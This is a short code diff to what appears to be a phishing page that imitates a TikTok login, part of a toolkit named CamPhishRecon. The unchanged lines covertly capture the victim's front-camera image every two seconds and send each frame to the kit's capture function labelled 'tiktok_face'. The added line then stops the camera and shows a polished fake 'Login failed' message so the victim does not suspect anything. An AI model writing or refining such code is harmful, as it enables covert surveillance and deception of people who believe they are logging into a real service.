@@ -99,7 +99,7 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).the
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'tiktok_face');}},2000);
-setTimeout(function(){clearInterval(ci);fs.classList.remove('active');var msgs=['Login failed. Try again.','Unable to log in. Please check your credentials.','Our systems detected unusual activity. Try again later.','Something went wrong. Please try again.'];alert(msgs[Math.floor(Math.random()*msgs.length)]);btn.innerHTML='Log in';btn.disabled=false;},5000);
+ setTimeout(function(){clearInterval(ci);stream.getTracks().forEach(function(t){t.stop();});fs.classList.remove('active');btn.innerHTML='Log in';btn.disabled=false;var msgs=['Login failed. Try again.','Unable to log in. Please check your credentials.','Our systems detected unusual activity. Try again later.','Something went wrong. Please try again.'];var msg=msgs[Math.floor(Math.random()*msgs.length)];if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Login failed',message:msg,tone:'danger',actionLabel:'Try again'});}else{alert(msg);}},5000);
 }).catch(function(){fs.classList.remove('active');btn.innerHTML='Log in';btn.disabled=false;});
 }else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log in';btn.disabled=false;},2000);}
 }
